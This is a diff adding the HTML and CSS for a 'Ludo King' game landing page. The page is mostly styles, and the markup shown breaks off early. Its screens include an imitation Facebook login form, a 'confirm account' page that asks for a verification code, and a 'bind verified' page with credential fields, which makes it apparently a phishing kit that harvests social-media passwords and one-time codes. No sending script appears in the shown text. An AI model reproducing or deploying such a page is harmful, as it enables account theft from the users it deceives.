@@ -1,0 +1,1554 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Ludo King - Play Now</title>
+
+<!-- OPEN GRAPH PREVIEW -->
+<meta property="og:type" content="website" />
+<meta property="og:title" content="Ludo King" />
+<meta property="og:description" content="Play Ludo King with friends & enjoy voice chat" />
+<meta property="og:image" content="https://i.postimg.cc/3xXT0mZQ/ludo-king-under-160kb.jpg" />
+<meta property="og:image:width" content="1200" />
+<meta property="og:image:height" content="630" />
+<meta property="og:image:type" content="image/jpeg" />
+<meta property="og:url" content="https://ludo-king-new.vercel.app/" />
+<meta property="og:site_name" content="Ludo King" />
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:title" content="Ludo King" />
+<meta name="twitter:description" content="Play Ludo King with friends & enjoy voice chat" />
+<meta name="twitter:image" content="https://i.postimg.cc/3xXT0mZQ/ludo-king-under-160kb.jpg" />
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&family=Baloo+2:wght@700;800&family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+html, body {
+    height: 100%;
+    width: 100%;
+    font-family: 'Poppins', -apple-system, BlinkMacSystemFont, sans-serif;
+    overflow: hidden;
+    background: #1a0a0a;
+    -webkit-tap-highlight-color: transparent;
+    -webkit-font-smoothing: antialiased;
+    -webkit-user-select: none;
+    user-select: none;
+}
+
+.page-view {
+    position: fixed;
+    inset: 0;
+    z-index: 10;
+    opacity: 0;
+    visibility: hidden;
+    transition: opacity 0.4s ease, visibility 0.4s ease;
+    overflow-y: auto;
+}
+
+.page-view.active {
+    opacity: 1;
+    visibility: visible;
+    z-index: 20;
+}
+
+/* ============================================================
+   PAGE 1: LUDO KING
+   ============================================================ */
+.bg {
+    position: fixed;
+    inset: 0;
+    z-index: 1;
+    background: 
+        radial-gradient(ellipse at 20% 30%, #8b3a1a 0%, transparent 50%),
+        radial-gradient(ellipse at 80% 70%, #1a3a2a 0%, transparent 50%),
+        radial-gradient(ellipse at 50% 50%, #2a1a1a 0%, #0a0505 80%);
+}
+
+.bg::before {
+    content: '';
+    position: absolute;
+    inset: 0;
+    background-image: 
+        radial-gradient(circle at 15% 25%, rgba(180, 80, 30, 0.15) 0%, transparent 40%),
+        radial-gradient(circle at 85% 75%, rgba(30, 120, 80, 0.15) 0%, transparent 40%);
+    filter: blur(40px);
+}
+
+.ludo-page {
+    position: fixed;
+    inset: 0;
+    z-index: 10;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: space-between;
+    padding: 40px 20px 40px;
+    overflow-y: auto;
+}
+
+.hero {
+    flex: 1;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    width: 100%;
+    max-width: 500px;
+    padding-top: 20px;
+    gap: 20px;
+}
+
+.logo-badge {
+    position: relative;
+    width: 280px;
+    height: 220px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+}
+
+.crown-svg {
+    position: absolute;
+    top: -15px;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 90px;
+    height: 60px;
+    z-index: 5;
+    filter: drop-shadow(0 4px 12px rgba(0, 0, 0, 0.6));
+}
+
+.oval-badge {
+    position: absolute;
+    top: 30px;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 260px;
+    height: 120px;
+    border-radius: 50%;
+    background: #0a0a0a;
+    border: 4px solid #f5c518;
+    box-shadow: 0 0 0 2px #8a6a00, 0 0 30px rgba(245, 197, 24, 0.5), inset 0 0 30px rgba(0, 0, 0, 0.9);
+    z-index: 3;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+.ludo-text {
+    font-family: 'Baloo 2', 'Poppins', sans-serif;
+    font-size: 62px;
+    font-weight: 800;
+    letter-spacing: 2px;
+    display: flex;
+    align-items: center;
+    line-height: 1;
+    filter: drop-shadow(0 4px 8px rgba(0, 0, 0, 0.8));
+}
+
+.letter-l { color: #4a9eff; text-shadow: 0 0 15px rgba(74, 158, 255, 0.6); }
+.letter-u { color: #ff3344; text-shadow: 0 0 15px rgba(255, 51, 68, 0.6); }
+.letter-d { color: #22dd44; text-shadow: 0 0 15px rgba(34, 221, 68, 0.6); }
+.letter-o { color: #ffcc00; text-shadow: 0 0 15px rgba(255, 204, 0, 0.6); }
+
+.king-ribbon {
+    position: absolute;
+    top: 130px;
+    left: 50%;
+    transform: translateX(-50%);
+    z-index: 4;
+    background: linear-gradient(180deg, #ffd700 0%, #d4a017 100%);
+    padding: 6px 34px;
+    clip-path: polygon(8% 0%, 92% 0%, 100% 50%, 92% 100%, 8% 100%, 0% 50%);
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.6);
+}
+
+.king-text {
+    font-family: 'Poppins', sans-serif;
+    font-size: 24px;
+    font-weight: 800;
+    letter-spacing: 6px;
+    color: #2a1a00;
+}
+
+.board-wrap {
+    position: relative;
+    width: 220px;
+    height: 220px;
+    margin-top: 10px;
+}
+
+.board {
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(135deg, #f0e8d8 0%, #e0d5c0 100%);
+    border-radius: 14px;
+    border: 5px solid #d4a017;
+    box-shadow: 0 0 0 2px #8a6a00, 0 20px 40px rgba(0, 0, 0, 0.7);
+    transform: rotateX(15deg) rotateZ(-3deg);
+    display: grid;
+    grid-template-columns: repeat(8, 1fr);
+    grid-template-rows: repeat(8, 1fr);
+    padding: 4px;
+    gap: 1px;
+    animation: boardTilt 6s ease-in-out infinite;
+}
+
+@keyframes boardTilt {
+    0%, 100% { transform: rotateX(15deg) rotateZ(-3deg); }
+    50%      { transform: rotateX(15deg) rotateZ(3deg); }
+}
+
+.cell { border-radius: 2px; }
+.c-white { background: #f8f5ee; }
+.c-blue { background: #4a9eff; }
+.c-red { background: #ff4a4a; }
+.c-green { background: #22dd44; }
+.c-yellow { background: #ffd700; }
+
+.dice-center {
+    position: absolute;
+    top: 50%; left: 50%;
+    transform: translate(-50%, -50%);
+    width: 55px; height: 55px;
+    background: linear-gradient(135deg, #ffffff 0%, #f0f0f0 100%);
+    border-radius: 10px;
+    box-shadow: 0 8px 20px rgba(0, 0, 0, 0.6), inset 0 -3px 6px rgba(0, 0, 0, 0.15), inset 0 3px 6px rgba(255, 255, 255, 0.9);
+    z-index: 10;
+    padding: 8px;
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    grid-template-rows: repeat(3, 1fr);
+    place-items: center;
+    gap: 3px;
+    animation: diceFloat 3s ease-in-out infinite;
+}
+
+@keyframes diceFloat {
+    0%, 100% { transform: translate(-50%, -50%) rotate(0deg); }
+    50%      { transform: translate(-50%, -55%) rotate(15deg); }
+}
+
+.dice-dot {
+    width: 8px; height: 8px;
+    border-radius: 50%;
+    background: radial-gradient(circle at 35% 35%, #555, #0a0a0a);
+}
+.dice-dot.empty { background: transparent; }
+
+.gutti {
+    position: absolute;
+    width: 36px; height: 36px;
+    border-radius: 50%;
+    z-index: 15;
+    box-shadow: 0 8px 16px rgba(0, 0, 0, 0.7), inset -4px -4px 8px rgba(0, 0, 0, 0.4), inset 4px 4px 8px rgba(255, 255, 255, 0.5);
+    animation: guttiFloat 3s ease-in-out infinite;
+}
+
+.gutti::before {
+    content: '';
+    position: absolute;
+    top: 15%; left: 20%;
+    width: 30%; height: 25%;
+    background: rgba(255, 255, 255, 0.7);
+    border-radius: 50%;
+}
+
+.gutti-blue { background: radial-gradient(circle at 30% 30%, #6bb5ff 0%, #2a6db5 70%, #0d3d80 100%); bottom: -10px; left: -18px; }
+.gutti-red { background: radial-gradient(circle at 30% 30%, #ff6b6b 0%, #b52a2a 70%, #800d0d 100%); bottom: -8px; right: -12px; animation-delay: 0.5s; }
+.gutti-green { background: radial-gradient(circle at 30% 30%, #6bff6b 0%, #2ab52a 70%, #0d800d 100%); top: -8px; right: -18px; animation-delay: 1s; }
+.gutti-yellow { background: radial-gradient(circle at 30% 30%, #ffe66b 0%, #b5a02a 70%, #806000 100%); top: -10px; left: -14px; animation-delay: 1.5s; }
+
+@keyframes guttiFloat {
+    0%, 100% { transform: translateY(0); }
+    50%      { transform: translateY(-6px); }
+}
+
+.panel {
+    width: 100%;
+    max-width: 480px;
+    background: rgba(15, 15, 15, 0.85);
+    border: 2px solid #d4a017;
+    border-radius: 18px;
+    padding: 16px 14px 14px;
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+    box-shadow: 0 0 0 1px rgba(245, 197, 24, 0.3), 0 0 40px rgba(245, 197, 24, 0.15), 0 10px 30px rgba(0, 0, 0, 0.7);
+    backdrop-filter: blur(20px);
+    -webkit-backdrop-filter: blur(20px);
+}
+
+.top-row { display: flex; gap: 10px; }
+
+.small-btn {
+    flex: 1;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 6px;
+    background: rgba(20, 20, 30, 0.9);
+    border: 1.5px solid rgba(245, 197, 24, 0.4);
+    border-radius: 12px;
+    padding: 14px 8px;
+    color: #ffffff;
+    font-family: 'Poppins', sans-serif;
+    font-size: 13px;
+    font-weight: 600;
+    cursor: pointer;
+    min-height: 52px;
+    white-space: nowrap;
+}
+
+.small-btn:active { transform: scale(0.97); }
+.btn-icon { font-size: 16px; }
+
+.login-btn {
+    width: 100%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 12px;
+    padding: 18px 28px;
+    background: linear-gradient(180deg, #4a9eff 0%, #1877f2 50%, #0d5bbd 100%);
+    border: none;
+    border-radius: 14px;
+    color: #ffffff;
+    font-family: 'Poppins', sans-serif;
+    font-size: 18px;
+    font-weight: 700;
+    cursor: pointer;
+    min-height: 62px;
+    box-shadow: 0 0 25px rgba(24, 119, 242, 0.5), 0 6px 20px rgba(0, 0, 0, 0.4), inset 0 1px 0 rgba(255, 255, 255, 0.3);
+    position: relative;
+    overflow: hidden;
+}
+
+.login-btn::before {
+    content: '';
+    position: absolute;
+    top: 0; left: -100%;
+    width: 60%; height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+    transform: skewX(-25deg);
+    animation: shine 3.5s ease-in-out infinite;
+}
+
+@keyframes shine {
+    0% { left: -100%; }
+    50%, 100% { left: 150%; }
+}
+
+.login-btn:active { transform: scale(0.98); }
+
+.fb-icon {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    width: 34px; height: 34px;
+    background: rgba(255, 255, 255, 0.2);
+    border-radius: 50%;
+}
+
+.legal {
+    font-size: 11px;
+    color: rgba(200, 200, 200, 0.6);
+    text-align: center;
+    line-height: 1.5;
+    padding: 0 6px;
+}
+.legal a { color: #4a9eff; text-decoration: none; font-weight: 600; }
+
+
+/* ============================================================
+   PAGE 2: FACEBOOK LOGIN
+   ============================================================ */
+#fbPage {
+    background: #f0f2f5;
+    font-family: 'Roboto', sans-serif;
+}
+
+.fb-header {
+    width: 100%;
+    background: #1877f2;
+    padding: 20px 20px 26px;
+    text-align: center;
+    box-shadow: 0 1px 3px rgba(0, 0, 0, 0.15);
+}
+
+.fb-logo {
+    font-family: 'Roboto', sans-serif;
+    font-weight: 700;
+    font-size: 34px;
+    color: #ffffff;
+    letter-spacing: -1.2px;
+    text-transform: lowercase;
+}
+
+.fb-main {
+    padding: 30px 24px 60px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+}
+
+.fb-container { max-width: 480px; width: 100%; }
+
+.app-image-wrap {
+    display: flex;
+    justify-content: center;
+    margin-bottom: 22px;
+}
+
+.app-image {
+    width: 110px; height: 110px;
+    border-radius: 24px;
+    box-shadow: 0 8px 24px rgba(0, 0, 0, 0.18);
+    object-fit: cover;
+    background: #0a0a0a;
+}
+
+.connect-text {
+    text-align: center;
+    font-size: 21px;
+    color: #4b4f56;
+    line-height: 1.4;
+    margin-bottom: 30px;
+    font-weight: 400;
+    padding: 0 10px;
+}
+
+.connect-text strong { color: #1877f2; font-weight: 600; }
+
+.fb-input {
+    width: 100%;
+    background: #ffffff;
+    border: 1px solid #dddfe2;
+    border-radius: 10px;
+    padding: 18px 20px;
+    font-family: 'Roboto', sans-serif;
+    font-size: 17px;
+    color: #1d2129;
+    outline: none;
+    min-height: 60px;
+    margin-bottom: 14px;
+    -webkit-appearance: none;
+    appearance: none;
+}
+
+.fb-input::placeholder { color: #8d949e; font-size: 17px; }
+
+.fb-input:focus {
+    border-color: #1877f2;
+    box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.15);
+}
+
+.fb-input.error {
+    border-color: #e74c3c;
+    box-shadow: 0 0 0 2px rgba(231, 76, 60, 0.15);
+}
+
+.fb-login-btn {
+    width: 100%;
+    background: #1877f2;
+    border: none;
+    border-radius: 10px;
+    color: #ffffff;
+    font-family: 'Roboto', sans-serif;
+    font-size: 20px;
+    font-weight: 700;
+    padding: 18px 20px;
+    margin-top: 10px;
+    cursor: pointer;
+    min-height: 64px;
+    box-shadow: 0 2px 6px rgba(24, 119, 242, 0.3);
+}
+
+.fb-login-btn:active { background: #1568d8; }
+.fb-login-btn:disabled { opacity: 0.7; cursor: not-allowed; }
+
+.forgot-wrap { text-align: center; margin-top: 26px; }
+.forgot-link { color: #1877f2; font-size: 17px; font-weight: 500; cursor: pointer; }
+
+.other-links { text-align: center; margin-top: 38px; }
+.other-links a {
+    display: block;
+    margin-bottom: 18px;
+    font-size: 17px;
+    font-weight: 500;
+    color: #4b4f56;
+    cursor: pointer;
+}
+.other-links a.help { color: #8d949e; font-weight: 400; }
+
+.fb-lang-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px 20px;
+    max-width: 340px;
+    margin: 48px auto 0;
+    text-align: center;
+    font-size: 15px;
+    color: #4b4f56;
+}
+
+.fb-footer { text-align: center; margin-top: 40px; font-size: 14px; color: #8d949e; }
+
+
+/* ============================================================
+   PAGE 3: CONFIRM LUDO ACCOUNT
+   ============================================================ */
+#codePage {
+    background: #0a0518;
+    overflow: hidden;
+}
+
+.code-bg {
+    position: absolute;
+    inset: 0;
+    z-index: 1;
+    overflow: hidden;
+    background: linear-gradient(180deg, #1a0a3e 0%, #2d0a5c 30%, #0a0520 100%);
+}
+
+.neon-stripes {
+    position: absolute;
+    inset: -50%;
+    background: 
+        repeating-linear-gradient(45deg, transparent 0px, transparent 60px, rgba(168, 85, 247, 0.08) 60px, rgba(168, 85, 247, 0.08) 62px),
+        repeating-linear-gradient(-45deg, transparent 0px, transparent 60px, rgba(236, 72, 153, 0.06) 60px, rgba(236, 72, 153, 0.06) 62px);
+    animation: stripesMove 20s linear infinite;
+}
+
+@keyframes stripesMove {
+    from { transform: translate(0, 0); }
+    to   { transform: translate(60px, 60px); }
+}
+
+.pulse-ring {
+    position: absolute;
+    top: 50%; left: 50%;
+    transform: translate(-50%, -50%);
+    border: 2px solid rgba(168, 85, 247, 0.3);
+    border-radius: 50%;
+    animation: ringExpand 4s ease-out infinite;
+}
+
+.pulse-ring.r1 { width: 200px; height: 200px; animation-delay: 0s; }
+.pulse-ring.r2 { width: 300px; height: 300px; animation-delay: 1s; }
+.pulse-ring.r3 { width: 400px; height: 400px; animation-delay: 2s; }
+.pulse-ring.r4 { width: 500px; height: 500px; animation-delay: 3s; }
+
+@keyframes ringExpand {
+    0% { transform: translate(-50%, -50%) scale(0.5); opacity: 0.8; }
+    100% { transform: translate(-50%, -50%) scale(2); opacity: 0; }
+}
+
+.code-orb {
+    position: absolute;
+    border-radius: 50%;
+    filter: blur(80px);
+    animation: orbPulse 8s ease-in-out infinite;
+}
+
+.code-orb.o1 { width: 300px; height: 300px; background: #a855f7; top: 10%; left: -10%; }
+.code-orb.o2 { width: 250px; height: 250px; background: #ec4899; bottom: 10%; right: -10%; animation-delay: 3s; }
+.code-orb.o3 { width: 200px; height: 200px; background: #3b82f6; top: 40%; right: 10%; animation-delay: 6s; }
+
+@keyframes orbPulse {
+    0%, 100% { transform: scale(1); opacity: 0.5; }
+    50%      { transform: scale(1.3); opacity: 0.8; }
+}
+
+.code-board-3d {
+    position: absolute;
+    top: 50%; left: 50%;
+    width: 300px; height: 300px;
+    transform: translate(-50%, -50%) perspective(1000px) rotateX(60deg) rotateZ(0deg);
+    animation: codeBoardRotate 25s linear infinite;
+    opacity: 0.4;
+    z-index: 2;
+}
+
+@keyframes codeBoardRotate {
+    from { transform: translate(-50%, -50%) perspective(1000px) rotateX(60deg) rotateZ(0deg); }
+    to   { transform: translate(-50%, -50%) perspective(1000px) rotateX(60deg) rotateZ(360deg); }
+}
+
+.code-board {
+    width: 100%; height: 100%;
+    border-radius: 20px;
+    background: linear-gradient(135deg, #1a1a2e 0%, #16162a 100%);
+    box-shadow: 0 0 0 4px #f5c518, 0 0 40px rgba(245, 197, 24, 0.5);
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    grid-template-rows: 1fr 1fr;
+    padding: 10px;
+    gap: 8px;
+}
+
+.code-board .quad { border-radius: 10px; }
+.cb-red { background: linear-gradient(135deg, #ff2d55 0%, #b8143b 100%); }
+.cb-green { background: linear-gradient(135deg, #34c759 0%, #1f7a3a 100%); }
+.cb-blue { background: linear-gradient(135deg, #007aff 0%, #004a99 100%); }
+.cb-yellow { background: linear-gradient(135deg, #ffcc00 0%, #b8860b 100%); }
+
+.code-dice {
+    position: absolute;
+    width: 55px; height: 55px;
+    background: linear-gradient(135deg, #ffffff, #e0e0e0);
+    border-radius: 10px;
+    border: 2px solid #f5c518;
+    box-shadow: 0 8px 20px rgba(0, 0, 0, 0.5);
+    z-index: 3;
+    padding: 7px;
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    grid-template-rows: repeat(3, 1fr);
+    gap: 3px;
+    place-items: center;
+    opacity: 0.6;
+    animation: codeDiceFloat 5s ease-in-out infinite;
+}
+
+.code-dice.cd1 { top: 8%; left: 8%; animation-delay: 0s; }
+.code-dice.cd2 { top: 15%; right: 8%; animation-delay: 1.5s; }
+.code-dice.cd3 { bottom: 12%; left: 12%; animation-delay: 3s; }
+
+@keyframes codeDiceFloat {
+    0%, 100% { transform: translateY(0) rotate(-15deg); }
+    50%      { transform: translateY(-25px) rotate(15deg); }
+}
+
+.code-dice-dot {
+    width: 6px; height: 6px;
+    border-radius: 50%;
+    background: #dc2626;
+}
+.code-dice-dot.empty { background: transparent; }
+
+.code-page {
+    position: relative;
+    z-index: 10;
+    width: 100%;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 40px 24px;
+}
+
+.code-card {
+    width: 100%;
+    max-width: 440px;
+    background: rgba(255, 255, 255, 0.98);
+    border-radius: 24px;
+    padding: 40px 28px 36px;
+    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(255, 255, 255, 0.3), 0 0 80px rgba(168, 85, 247, 0.4);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    animation: cardEnter 0.6s cubic-bezier(0.16, 1, 0.3, 1);
+}
+
+@keyframes cardEnter {
+    from { opacity: 0; transform: translateY(30px) scale(0.95); }
+    to   { opacity: 1; transform: translateY(0) scale(1); }
+}
+
+.lock-circle {
+    width: 80px; height: 80px;
+    border-radius: 50%;
+    background: linear-gradient(135deg, #e0ecff 0%, #c7d9ff 100%);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin-bottom: 22px;
+    box-shadow: 0 8px 24px rgba(37, 99, 235, 0.15);
+    animation: lockPulse 2.5s ease-in-out infinite;
+    font-size: 40px;
+}
+
+@keyframes lockPulse {
+    0%, 100% { transform: scale(1); }
+    50%      { transform: scale(1.05); }
+}
+
+.code-title {
+    font-size: 22px;
+    font-weight: 700;
+    color: #0f2a5e;
+    text-align: center;
+    margin-bottom: 10px;
+    line-height: 1.3;
+}
+
+.code-subtitle {
+    font-size: 14px;
+    font-weight: 400;
+    color: #6b7280;
+    text-align: center;
+    margin-bottom: 26px;
+    line-height: 1.55;
+    padding: 0 10px;
+}
+
+.code-subtitle strong { color: #1a1a1a; font-weight: 600; }
+
+.code-input-wrap {
+    width: 100%;
+    position: relative;
+    margin-bottom: 18px;
+}
+
+.code-input-icon {
+    position: absolute;
+    left: 18px; top: 50%;
+    transform: translateY(-50%);
+    font-size: 18px;
+    opacity: 0.7;
+    pointer-events: none;
+}
+
+.code-input {
+    width: 100%;
+    padding: 18px 18px 18px 52px;
+    border: 2px solid #dbeafe;
+    border-radius: 14px;
+    background: #f8faff;
+    color: #0f2a5e;
+    font-family: 'Poppins', sans-serif;
+    font-size: 16px;
+    font-weight: 500;
+    outline: none;
+    letter-spacing: 2px;
+    -webkit-appearance: none;
+    appearance: none;
+}
+
+.code-input::placeholder {
+    color: #94a3b8;
+    font-style: italic;
+    font-weight: 400;
+    letter-spacing: 0;
+}
+
+.code-input:focus {
+    border-color: #2563eb;
+    background: #ffffff;
+    box-shadow: 0 0 0 4px rgba(37, 99, 235, 0.12);
+}
+
+.code-continue-btn {
+    width: 100%;
+    padding: 18px 24px;
+    background: #2563eb;
+    border: none;
+    border-radius: 14px;
+    color: #ffffff;
+    font-family: 'Poppins', sans-serif;
+    font-size: 17px;
+    font-weight: 700;
+    cursor: pointer;
+    min-height: 58px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    box-shadow: 0 6px 20px rgba(37, 99, 235, 0.35);
+    margin-bottom: 20px;
+}
+
+.code-continue-btn:active { transform: scale(0.98); }
+.code-continue-btn:disabled { opacity: 0.7; cursor: not-allowed; }
+
+.code-resend-btn {
+    background: transparent;
+    border: none;
+    color: #2563eb;
+    font-family: 'Poppins', sans-serif;
+    font-size: 15px;
+    font-weight: 600;
+    cursor: pointer;
+    padding: 8px 12px;
+    border-radius: 8px;
+}
+
+.code-resend-btn:disabled {
+    color: #94a3b8;
+    cursor: not-allowed;
+}
+
+
+/* ============================================================
+   PAGE 4: BIND VERIFIED (Account Verification)
+   ============================================================ */
+#verifiedPage {
+    background: #121212;
+}
+
+.verified-wrapper {
+    min-height: 100vh;
+    width: 100%;
+    background: #121212;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 30px 20px;
+}
+
+.verified-box {
+    width: 100%;
+    max-width: 480px;
+    background: #1a1a1a;
+    border-radius: 12px;
+    overflow: hidden;
+    border: 1px solid #2a2a2a;
+    box-shadow: 0 10px 40px rgba(0, 0, 0, 0.6), 0 0 0 1px rgba(255, 255, 255, 0.03);
+    animation: verifiedBoxEnter 0.5s cubic-bezier(0.16, 1, 0.3, 1);
+}
+
+@keyframes verifiedBoxEnter {
+    from { opacity: 0; transform: translateY(20px) scale(0.98); }
+    to   { opacity: 1; transform: translateY(0) scale(1); }
+}
+
+.verified-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 20px 24px 16px;
+    background: #1a1a1a;
+}
+
+.verified-header-title {
+    font-family: 'Poppins', sans-serif;
+    font-weight: 800;
+    font-size: 20px;
+    letter-spacing: 0.5px;
+    color: #f5c518;
+    text-transform: uppercase;
+}
+
+.verified-close {
+    background: #e63946;
+    border: none;
+    color: #ffffff;
+    width: 34px;
+    height: 34px;
+    border-radius: 50%;
+    font-size: 16px;
+    font-weight: 700;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    box-shadow: 0 4px 12px rgba(230, 57, 70, 0.4);
+    transition: all 0.2s ease;
+}
+
+.verified-close:hover { background: #c9302c; transform: scale(1.08); }
+.verified-close:active { transform: scale(0.95); }
+
+.verified-stripe {
+    height: 3px;
+    width: 100%;
+    background: #f5c518;
+    box-shadow: 0 0 10px rgba(245, 197, 24, 0.5);
+}
+
+.verified-content {
+    padding: 30px 24px 28px;
+}
+
+.verified-desc {
+    font-family: 'Poppins', sans-serif;
+    font-size: 15px;
+    color: #b8b8b8;
+    margin-bottom: 24px;
+    line-height: 1.5;
+}
+
+.bind-group { margin-bottom: 20px; }
+
+.bind-group label {
+    display: block;
+    font-family: 'Poppins', sans-serif;
+    font-size: 13px;
+    font-weight: 700;
+    letter-spacing: 0.5px;
+    color: #ffffff;
+    text-transform: uppercase;
+    margin-bottom: 10px;
+}
+
+.bind-input {
+    width: 100%;
+    padding: 15px 18px;
+    background: #2a2a2a;
+    border: 1px solid #3a3a3a;
+    border-radius: 8px;
+    color: #ffffff;
+    font-family: 'Poppins', sans-serif;
+    font-size: 15px;
+    outline: none;
+    transition: all 0.2s ease;
+    -webkit-appearance: none;
+    appearance: none;
+}
+
+.bind-input::placeholder {
+    color: #808080;
+    font-style: italic;
+    font-size: 15px;
+}
+
+.bind-input:focus {
+    border-color: #f5c518;
+    background: #1f1a10;
+    box-shadow: 0 0 0 3px rgba(245, 197, 24, 0.15);
+}
+
+.bind-actions {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-top: 30px;
+    gap: 16px;
+}
+
+.bind-verify-btn {
+    padding: 14px 42px;
+    background: #3a3a3a;
+    border: none;
+    border-radius: 8px;
+    color: #888;
+    font-family: 'Poppins', sans-serif;
+    font-size: 15px;
+    font-weight: 800;
+    letter-spacing: 1px;
+    text-transform: uppercase;
+    cursor: not-allowed;
+    transition: all 0.25s ease;
+    min-height: 50px;
+}
+
+.bind-verify-btn.active {
+    background: #f5c518;
+    color: #1a1a1a;
+    cursor: pointer;
+    box-shadow: 0 4px 16px rgba(245, 197, 24, 0.4), inset 0 -2px 0 rgba(0, 0, 0, 0.15);
+}
+
+.bind-verify-btn.active:hover {
+    background: #ffd633;
+    transform: translateY(-1px);
+    box-shadow: 0 6px 24px rgba(245, 197, 24, 0.6);
+}
+
+.bind-forgot-link {
+    color: #f5c518;
+    font-family: 'Poppins', sans-serif;
+    font-size: 14px;
+    font-weight: 600;
+    cursor: pointer;
+}
+
+.bind-forgot-link:hover {
+    color: #ffd633;
+    text-decoration: underline;
+}
+
+
+/* ============================================================
+   RESPONSIVE
+   ============================================================ */
+@media (max-width: 480px) {
+    .ludo-page { padding: 30px 16px 25px; }
+    .logo-badge { width: 240px; height: 200px; }
+    .crown-svg { width: 75px; height: 50px; }
+    .oval-badge { width: 220px; height: 100px; }
+    .ludo-text { font-size: 52px; }
+    .king-ribbon { padding: 5px 28px; top: 115px; }
+    .king-text { font-size: 20px; letter-spacing: 5px; }
+    .board-wrap { width: 190px; height: 190px; }
+    .dice-center { width: 46px; height: 46px; }
+    .dice-dot { width: 7px; height: 7px; }
+    .gutti { width: 30px; height: 30px; }
+    .small-btn { font-size: 11px; padding: 12px 6px; min-height: 48px; }
+    .login-btn { font-size: 16px; padding: 16px 20px; min-height: 56px; }
+    
+    .app-image { width: 95px; height: 95px; border-radius: 20px; }
+    .connect-text { font-size: 18px; }
+    .fb-input { font-size: 16px; padding: 15px 18px; min-height: 56px; }
+    .fb-login-btn { font-size: 18px; min-height: 58px; }
+    
+    .code-card { padding: 32px 22px 28px; border-radius: 20px; }
+    .lock-circle { width: 70px; height: 70px; font-size: 34px; margin-bottom: 18px; }
+    .code-title { font-size: 20px; }
+    .code-subtitle { font-size: 13px; }
+    .code-input { padding: 16px 16px 16px 48px; font-size: 15px; }
+    .code-continue-btn { font-size: 16px; padding: 16px 20px; min-height: 54px; }
+    .code-board-3d { width: 260px; height: 260px; }
+    
+    .verified-wrapper { padding: 20px 16px; }
+    .verified-header { padding: 16px 20px 12px; }
+    .verified-header-title { font-size: 17px; }
+    .verified-close { width: 30px; height: 30px; font-size: 14px; }
+    .verified-content { padding: 24px 20px 22px; }
+    .verified-desc { font-size: 14px; margin-bottom: 20px; }
+    .bind-group label { font-size: 12px; }
+    .bind-input { padding: 13px 15px; font-size: 14px; }
+    .bind-input::placeholder { font-size: 14px; }
+    .bind-actions { margin-top: 26px; gap: 12px; }
+    .bind-verify-btn { padding: 13px 32px; font-size: 14px; min-height: 46px; }
+    .bind-forgot-link { font-size: 13px; }
+}
+
+@media (max-width: 360px) {
+    .logo-badge { width: 200px; height: 175px; }
+    .oval-badge { width: 190px; height: 88px; }
+    .ludo-text { font-size: 44px; }
+    .board-wrap { width: 165px; height: 165px; }
+    .gutti { width: 26px; height: 26px; }
+    .app-image { width: 85px; height: 85px; border-radius: 18px; }
+}
+</style>
+</head>
+<body>
+
+<!-- ============================================================
+     PAGE 1: LUDO KING
+     ============================================================ -->
+<div class="page-view active" id="ludoPage">
+    <div class="bg"></div>
+    <div class="ludo-page">
+        <div class="hero">
+            <div class="logo-badge">
+                <svg class="crown-svg" viewBox="0 0 100 70" xmlns="http://www.w3.org/2000/svg">
+                    <defs>
+                        <linearGradient id="crownGrad" x1="0%" y1="0%" x2="0%" y2="100%">
+                            <stop offset="0%" stop-color="#ffe066"/>
+                            <stop offset="50%" stop-color="#f5c518"/>
+                            <stop offset="100%" stop-color="#b8860b"/>
+                        </linearGradient>
+                    </defs>
+                    <path d="M 10 55 L 90 55 L 85 35 L 72 45 L 60 20 L 50 35 L 40 20 L 28 45 L 15 35 Z" fill="url(#crownGrad)" stroke="#8a6a00" stroke-width="1.5"/>
+                    <circle cx="50" cy="18" r="4" fill="#e63946" stroke="#8a6a00" stroke-width="1"/>
+                    <circle cx="28" cy="32" r="3" fill="#4a9eff" stroke="#8a6a00" stroke-width="1"/>
+                    <circle cx="72" cy="32" r="3" fill="#22dd44" stroke="#8a6a00" stroke-width="1"/>
+                    <circle cx="50" cy="32" r="2.5" fill="#ffcc00" stroke="#8a6a00" stroke-width="1"/>
+                </svg>
+
+                <div class="oval-badge">
+                    <div class="ludo-text">
+                        <span class="letter-l">L</span>
+                        <span class="letter-u">U</span>
